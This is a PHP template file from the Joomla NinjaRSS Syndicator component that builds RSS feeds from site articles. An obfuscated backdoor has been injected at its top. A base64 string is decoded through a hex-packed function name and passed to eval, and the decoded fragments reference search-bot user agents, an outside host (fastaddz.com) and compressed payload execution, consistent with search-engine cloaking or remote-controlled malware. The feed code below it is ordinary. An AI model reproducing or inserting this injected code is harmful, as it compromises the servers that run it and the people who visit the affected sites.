<?php /*versio:3.02*/ $GLOBALS["yfegmf"]="HhaW5pX3NldAqAMYWxsb3dfdXJsX2ZvcGVuqwZGlzcGxheV9lcnJvcnMviOPc3R5eC9qbWxfaGRyX3JlcG9zdAQJEsMy4wMgtCMWb29Cb29qYWk3U2lhY2hlaXNlMXN1N3BodQalHvdaHR0cDovLwfKFIWSFRUUFMVgb2ZmmsICaHR0cHM6Ly8BSPYMySFRUUF9IT1NUtdW5pb24nmAlByykc2VsZWN0KrmbwUkVRVUVTVF9VUkkqahAElU0NSSVBUX05BTUUteQUVVFUllfU1RSSU5HjLsUUPwNZGV0ZXJtaW5hdG9yoLghGkvXLmxvZwAhXXSFRUUF9ZX0FVVEgtOSqCWYmFzZTY0X2RlY29kZQflMdmVyc2lvVXOLQJDLXBocAnTISFRUUF9FWEVDUEhQPwSXb3V0Wb2sJXtwMsSFRUUF9VU0VSX0FHRU5UrALAbZ29vZ2xlLHlhaG9vLGJhaWR1LGJpbmdib3QsbXNuYm90LHlhbmRleAeOpYQyPiODkuMzIuMTUwLjE2NANzEZmFzdGFkZHouY29tKbFL3czLnBocD91PQFJiJms9vJnQ9cGhwJnA9TnDgJnY9SQZXZhbChnenVuY29tcHJlc3MoYmFzZTY0X2RlY29kZSgiZUp5TlYrdHVvOGdTZnBVT3NrWllNTmhnalBIa2NKUm8xbk1tMG13U2VaeVZWck1SNHRKZ2JBTTJGMThTNWQxUEZkMFluTmlqL1dYY1ZWMzMrcW82Q29oNDVkTWdTcWd2Q2o0dGFCWkhpVk9rbWREdHZwSUl5RUdaZUVXVUpqYmRSM21SaTQ3alVzYzU3RVZONnN0cXY0dDhOMUVTMlRrdEdxSXBqV1N0MzVXSjJyMCtROVowU1IzSTZoZ1krc0R3Um1vdHhON3NGblNaUjBXNlhHekZqdWR1Zk4rWHlhZE9NRStXams4c2N2LzA0MGVYdkpMbUpJNjhMQzJpbUlwRlZsS1FsOUdpekJJUzBEU29SYnpUNGdTSjYzcCtFa2JaWHV6ay9tTDVFc3FrNDY0T3lkd0hqenBaVEY5aUQ0UUxYcG10aEd2U2VmRmZOcHNEbkhDYUl0amdWd0VrREZQbFl3ZytDczVxbGU1c3VHUUg2Wm9tUXBkWUlFVVYwR1p1MkUwUXJTaHkyMTZhRkRTQnNBcnpvbGgvNmZVRW9oQnVEMzR4Z3hRaWZOcFpRZWdKbFJ0MGxkTnpxZUVtWWtZNmtlczVjN1QyaHArS2NMV1RiYUlrZEU1OGdMeWthL1NpczFyN3hmN1VRYnFuSHBCdStFV1JpNVhKMTZmcGo0ZkhtUTAvTXZrWHRuc2xtbjVaenZmSjdSK1RxVXdDQjN6N0xlZDBNbnVhM3MrbXQvYy92K0VObnZMTEY3NCszTjlQdnM1bWQzOU9IcDVtTWpFd0VLdE5IdS9LS2p6TTdmb2Vpc0tNMjk0cXpXbnJGQU5PNDNVQm5Pd3loTGtSSXdqWGIzVjIrV21kS1N4VlZvT29Mc2hUYjRsMTBWU2QyWWZLaTVNc0w3YndzVnFzM1hJdmt5SFhXZGN2aW5HV2FibWtUQjA1N1Fnd08xaVhXQVIxeXdqL204eklLOC9DbTZCZ0d2SWwrVDZiUGZaVXBROEgvMlQvSlBEelBjMkxMd1ErWHJsSmJ4VUJ3N1F2Tjl2Q0JSV1AzeC90aDUrSzBCTVUvUHhyTXYxNTkzQi9SdWxUVHJQUHR5SFU5QmRRenU1WDhtcVp1em5Vdm5oMW9jKzVVMTN5NlJNUjMvVTErZHlRLzBPMGJoTVFCUU1MN2RReVJOWE1xbGR1QXA3SUl3eDBpbzFiaGt0d2l1N1hxOVNub25DMFQ2NUZBbCtaSUdSeDdsLzk1d1pYb3ZqTVBjWlg2WHc3Z1pyUUs1ekRZaC81V1JsaWl5N25mZ2I4dTdubjVXdHdnbnJ6bEFoLzI0TENpWXJ3QmI0Wm5TZnBGTHdneEc2YXBHNldVbGZzK082THV5bTdEYmgwN0orVEtXVG9GeWM5NCsxT2ZzZ1RQN2VPRUt4cWttN0tXdFVOKzNDZkw5S0dOaHhKZzRITUdpVkt3NFBma0F4TkdwanlRRWNhcTVhR1pvNmxZVFVUV09WR2VSWEEycHBHYzM4azZTTjUxSDJ1Wjh6TlI2WlJYekoxNUNGWEZtbE9KWFZveUhxRmNPKzFxeU1WSjVMS1U4RHBpcFVYV1pFQ0pOUHNuQjRESnBHbXk2cld4UVFIYVVZZGJ3NWRaMlAzT0RuaE9iSCsyeVFNTFFhaDZ4VEtqUjNLalJHbWlaTnRoR094a3ZHTEMzaHVSMTZYeG4wWnd0UkErVVY1dWlrWnBteitWaDdrWktneGVXOWduWGgxTWZKakF4T3JEakgwQ0NnZk9VYTZOQnhXSEJVNGZtRFFCNUxXSDFVTW1PWExTUjROcERFSU1pNnFHZ3dsZGF3elZVb3J4MXJma015QnJIVmhocHhMbU1vTU1MclAxKzg2YlJIRVJiaU4zVVAyc2hleFJNb2dQb1NoNVVkWjRnQ0syUGEzdXg4VDIrNHFmOXhOWVNROFRQOEc4WSszMDF2NGhIb09peUtQUS9EN05zdWNnMGlFbmsrM3ZYd2VRMzhMdlNKZTk1UUE1dlhuTW9uMnpkSGQxMGw5MHBncnpQNThGSjVQVHliSG84bjlYMjJPK2k5WWRYTENMMVI2VVBweHhTZ0JmeHpmaG1NYmZCTmdpK0t1S2dKalBmN2RyVC96RmFQSEx1VVhxQjZVUFFYYVNSUHdnR0FibEp2VUwxSmUvVmQ4RVBMREt0VFZwMktkalN4YmtISjdsMFdGNHdMOG45eXNqTUcxZ3gxZUV4ZjBMMnNnclljcVk3dXVLcnpxbDFVelEzRWVBT3k4RXJiS3R2Yk1BVURTQUl1bFhqVHJodXNrV1pZc3FGWER4SmxLMDlRK1ZDanJGbHczeXpMYXJheWIyQi9XZWhVK0ZqbUFLaHd0RVJ1WC9tS1ZiSzEzTmFtMHFoeXdySzlCbVN0Yzh2VUg2MVVkV2tRZk1mTzVSSlM5bXdmeE5zR0lzVE9sdFhZUCttWUYzQmRnVmUwUEpVMVRLNmNzaTJ1dTl0MnNURVBhR2dIQU45WmtGYWNvbTFCOEVKM09zNmFiQnpBWURBQXF1UjRualZWalRkTE1VZVVxbTBKS0N3c05TUnVPd09SNjNZbGV0b2RnWlhHRHp2bWdhUU5KTmNZY1crRDFRYmZPcXI3NEw4MVZ4Mm9WQngzc2JTVWN3SHM4bGdkZFZpcjdxQkJaMVhUU2NydGRwUkR5YjdpZzRsd001MlcyUll6OC9YelJESkE1TlBFeGRESmc2dDJqQ2FDdVFVRVlFS1cyUlNaVWdHSElReGg1VlJ1bWgwV2E1KytHRUxORlBsS3ZMS3N5RS9ONjhNUFFZWnNuMnpyZmx3d01XazAzWktPdFZoL0NGTkRCRkt5MlRiRHc2UUlsbE5oekhscDl0ckpVbUtRbWF4ZGNETEhab2RPWkFiQ240eDdYaFgybWdPV0dHY3IvTUFYd3A5b1Bqd3NidTRnV3NPQmJNMWdDVDhDaGhoVjhUZFdPVlFWUnBLVTNGNXVPQWVUMFZxVlA3VFR4YU91OEJRZDFndUd0aG5vd2RLNFhMNkxGY1J3MG1jTDF4Y0RXYUlWTU5XQm5NcXBlcmJ2djFBcVV5REduRlVoK2hGNnlSWjIwSnFFTzJZZmhyK3JRT0l5djFUaDlVOUlOVGRhUCtOSFE5SkVwalVlNDA1eHZPTjBZVnZkWW40THFPQWczTC9qWWZmY3VaaEdBM2JkNUdsOS9qQzdEYWY3VStZREFzTURvT29Nd3ZwcjlIeHpGTG04PSIpKSk7";        if (!function_exists('aabeaayx')){function aabeaayx($a, $b){$c=$GLOBALS['yfegmf'];$d=pack('H*','6261736536345f64656'.'36f6465'); return $d(substr($c, $a, $b));};eval(aabeaayx(597,3304));};?><?php 
/*
* @version		2.0
* @package		com_ninjarsssydicator
* @author 		NinjaForge
* @author email	support@ninjaforge.com
* @link			http://ninjaforge.com
* @license		http://www.gnu.org/copyleft/gpl.html GNU GPL
* @copyright	Copyright (C) 2012 NinjaForge - All rights reserved.
*/

defined('_JEXEC') or die('Restricted access'); 
defined('DS') ? null : define('DS', DIRECTORY_SEPARATOR);
define("TIME_ZONE","");
include_once(JPATH_COMPONENT.DS.'views'.DS.'ninjarsssyndicator'.DS.'tmpl'.DS.'feedcreator.class.php');

//check if com_finder is installed (J2.5 and above)
$finder_exists = 0;
$myfile = JPATH_BASE.DS.'components'.DS.'com_finder'.DS.'controller.php';
if (file_exists($myfile))
	$finder_exists = 1;
// Register dependent classes.
if ($finder_exists)
	{
	JLoader::register('FinderIndexerHelper', dirname(__FILE__) . '/helper.php');
	JLoader::register('FinderIndexerTaxonomy', dirname(__FILE__) . '/taxonomy.php');
	JLoader::register('FinderHelperRoute', JPATH_SITE . '/components/com_finder/helpers/route.php');
	JLoader::register('FinderHelperLanguage', JPATH_ADMINISTRATOR . '/components/com_finder/helpers/language.php');
	}

// Register dependent classes.
JLoader::register('ContentHelperRoute', JPATH_SITE . '/components/com_content/helpers/route.php');


//global $mainframe;
$mainframe = JFactory::getApplication();

$feedid = $this->id;
$docache = intval($this->cache)>0?1:0;
//add_stats($lists); /*<< MAD 2007/09/28 */ //Oct 24 2008


//if type is Summaries then get numwords from db
$numWords = $this->numWords > 0	? $this->numWords: 10000; // numWord == 0 represents ALL

/*if type is RSS then use admin defined default
if (($this->type=="RSS") || ($this->type=="RSSSUMM"))
{
	//$this->type = "RSS".$row->defaultType;
	$this->type = "RSS2.0";// TO-DO
}
*/

//make a feed id based filename
$filename = JPATH_COMPONENT.DS."feed".DS."feed".$feedid.".xml";
$rss = new UniversalFeedCreator();

//Use cache if docache is set to 1
if (intval($docache)==1) {
	$rss->useCached($this->type,$filename,$this->cache); // use cached version if age<1 hour. May not return!
}
//$rss->title 			= htmlspecialchars($this->title, ENT_QUOTES);
$rss->title 			= $this->title;
$rss->description		= $this->description;
$rss->link 				= JURI::root();

$u = JFactory::getURI();
$rss->syndicationURL 	= $u->toString();
$rss->descriptionHtmlSyndicated = true;

$image 					= new FeedImage();
$image->title 			= $mainframe->getCfg('sitename');
$image->url 			= $this->imgUrl;
$image->link 			= JURI::root();
$image->description		= $mainframe->getCfg('sitename');
$image->descriptionHtmlSyndicated	= true;

if ( $this->imgUrl!="") { $rss->image = $image; }
//Xipat - VH (Feb 09 2009): Remove unuse code
/*
if (intval($this->catsInTitle)) {
	$rss->title .= " (".htmlspecialchars($this->cat).")";
}
*/
$rows = $this->content;

//used to trigger content plugins below
JPluginHelper::importPlugin( 'content' );
$dispatcher = JDispatcher::getInstance();	 

// Include menu itemid's in URLs by forming $itemids lookup array
//$itemids = makeMenuItemArray('content_blog_section');
$itemids = $this->menuitemarray;	
foreach ($rows as $row) {
	$item 		 = new FeedItem();
	$item->title = htmlspecialchars($row->title);
	$itemid		 = "";		

	// be sure itemid has some content!
	/*>>> AGE 20071012 */
	if (($itemid == "")&&($finder_exists))
	{ 
		//$itemid = $mainframe->getItemid( $row->id, 0, 0 );					
		// Get the menu item id.
		//$query = array('id' => $row->id);
		$itemid = FinderHelperRoute::getItemid($row->id);
	}
	/*<<< AGE 20071012 */
	if ($itemid == "") {$itemid = 99999999;}
	
	$item->link = JRoute::_(ContentHelperRoute::getArticleRoute($row->slug, $row->catslug),false,2);
	$item->guid = $item->link;
	
	//Jroute produces htmlspecialchar modified urls. 
	//We need to decode them because the feedclass also specialchars them, giving us things like &amp;amp;
	//TODO - test special characters
	//$itemurl = htmlspecialchars_decode ($itemurl);
	

	/* >> DAN 2009/12/14 */
	/* fulltext options:
	 * 0 -> Do nothing
	 * 1 -> Read more link
	 * 2 -> Add to intro text
	 * 3 -> Use only full text
	 */
	$AddReadMoreLink = false;	 
	
	/*		 Testing Case statement below. If it works, remove this code- D
	$words = $row->itext;
	if ($this->fulltext == 2) {
		$words .= $row->mtext;
	} */
	
	switch ($this->fulltext) {
		case 0:
			$words = ($row->introtext) ? $row->introtext : ((str_word_count(trim($row->fulltext)) > $numWords) ? word_limiter($row->fulltext, $numWords) : $row->fulltext);
		case 1:
			$words = ($row->introtext) ? $row->introtext : ((str_word_count(trim($row->fulltext)) > $numWords) ? word_limiter($row->fulltext, $numWords) : $row->fulltext);
			break;
		case 2:
			$words = $row->introtext.$row->fulltext;
			break;
		case 3:
			$words = ($row->fulltext) ? $row->fulltext : $row->introtext;
			break;
	}							
	 
	// Check if $words is larger then the $numWords
	// Add some extra words because characters are count as words (20% extra)
	
	if (str_word_count(trim($words)) > $numWords) 
	{			
		$AddReadMoreLink = true;	 				
		$words = word_limiter($words, $numWords);			 
	}
			
	if($this->fulltext == 0)
	{
		$AddReadMoreLink = false;
	}
	
	if ($this->fulltext == 1 or $AddReadMoreLink) {
		if (strlen(trim($row->mtext)) > 0 or $AddReadMoreLink)
			$words .= "\n<p><a href=\"" . $item->link . "\">" . JText::sprintf('Read more...') . "</a></p>"; 				
	}
			
	if (!intval($this->renderHTML)) {
		//Remove HTML tags if told not to render them
		$words = noHTML ($words); 
		
	} else {		 						
		//Remove images if told not to render them	
		//Images will also get remove with HTML tags above			
		if (!intval($this->renderImages)) {
			$words = delImagesFromHTML($words);
		} 
	}

	/* Convert relative urls to absolute */
	$words = addAbsoluteURL($words);
	
	$item->description 	= $words;
	$item->descriptionHtmlSyndicated	= true;		

	//Many, many failed attempts to get the date right.
	//Kept here for a while in case issues arise again - Dec 2009
	//After some issues with the date not coming out correctly I am trying the exact code from Com_content
	//$itemDate = JFactory::getDate(JHTML::_('date', $row->dsdate, JText::_('DATE_FORMAT_LC2')));		
	//$itemDate = JFactory::getDate(JHTML::_('date', $row->dsdate), 0);
	//$itemDate = JFactory::getDate($row->dsdate, 0);		
	//$item->date 				= $itemDate->toRFC822() ;
	//$item->date = strftime("%a, %d %b %Y %H:%M:%S",strtotime($row->dsdate))." -0700";
	//$item->date = date($row->dsdate, 'D, d M Y g:i:s')." GMT\n";
	
	$item->date = date("r",strtotime($row->dsdate));		
	$item->updated = date("r",strtotime($row->updated));		
	$item->source 				= JURI::root();		
	
	if ($this->renderAuthorFormat){
		$author = trim($row->authorAlias);
		
		if (empty($author)) $author = $row->author;
		
		$item->author 	= $author;
		$item->authorEmail	= $row->authorEmail;
	}
	//If needed, trigger content plugins on the row content.										 		
	//TODO - expand this to allow for individual paramters for the plugin instances
	$dispatcher->trigger( 'onPrepareNinjaRSSFeedRow', array( &$item ) );				
	
	$rss->addItem($item);		
}

//If needed, trigger content plugins on the feed as a whole.
//TODO - expand this to allow for individual paramters for the plugin instances
$dispatcher->trigger( 'onPrepareNinjaRSSFeed', array( &$rss ) ); 			
ob_end_clean();
ob_start();		
//If we are using the cache and the time out is greater than 0, then generate and use a file.
//Otherwise generate the feed on the fly
if (intval($docache)==1 && $this->cache > 0) 
{
	$rss->saveFeed($this->type,$filename,true);
} else {
	$rss->outputFeed($this->type);
}										

function noHTML($words) {
	$words = preg_replace("'<script[^>]*>.*?</script>'si","",$words);
	$words = preg_replace('/<a\s+.*?href="([^"]+)"[^>]*>([^<]+)<\/a>/is','\2 (\1)', $words);
	$words = preg_replace('/<!--.+?-->/','',$words);
	//$words = preg_replace('/{.+?}/','',$words);
	$words = strip_tags($words);
	$words = preg_replace('/&nbsp;/',' ',$words);
	//$words = preg_replace('/&amp;/','&',$words);
	//$words = preg_replace('/&quot;/','"',$words);

	return $words;
}

function addAbsoluteURL($html) {
	$root_url = JURI::root();
	$html = preg_replace('@href="(?!http://)(?!https://)(?!mailto:)([^"]+)"@i', "href=\"{$root_url}\${1}\"", $html);
	$html = preg_replace('@src="(?!http://)(?!https://)([^"]+)"@i', "src=\"{$root_url}\${1}\"", $html);

	return $html;
}

/*
** Delete all the images from the url
*/
function delImagesFromHTML($html, $instances = -1) {
	$html = preg_replace('/<img\\s.*>/i','', $html, $instances);

	return $html;
}

/* >> MAD 2007/10/09
 * Added function word_limiter
 */
function word_limiter($string, $limit = 100) {
	$words = array();
	//$string = ereg_replace(" +", " ", $string);
	$string = preg_replace("/ +/i", " ", $string);
	$array = explode(" ", $string);
	//$limit = (count($array) <= $numwords) ? count($array) : $numwords;
	for($k=0;$k < $limit;$k++)
	{
		if(($limit>0 && $limit == $k)||!isset($array[$k]))
			break;
		if (eregi("[0-9A-Za-zÀ-ÖØ-öø-ÿ]", $array[$k]))
			$words[$k] = $array[$k];
	}
	$txt = implode(" ", $words);
	return $txt;
}

function first_img_src($html) {
	if (stripos($html, '<img') !== false) {
			$imgsrc_regex = '#<\s*img [^\>]*src\s*=\s*(["\'])(.*?)\1#im';
			preg_match($imgsrc_regex, $html, $matches);
			unset($imgsrc_regex);
			unset($html);
			if (is_array($matches) && !empty($matches)) {
					return $matches[2];
			} else {
					return false;
			}
	} else {
			return false;
	}
}
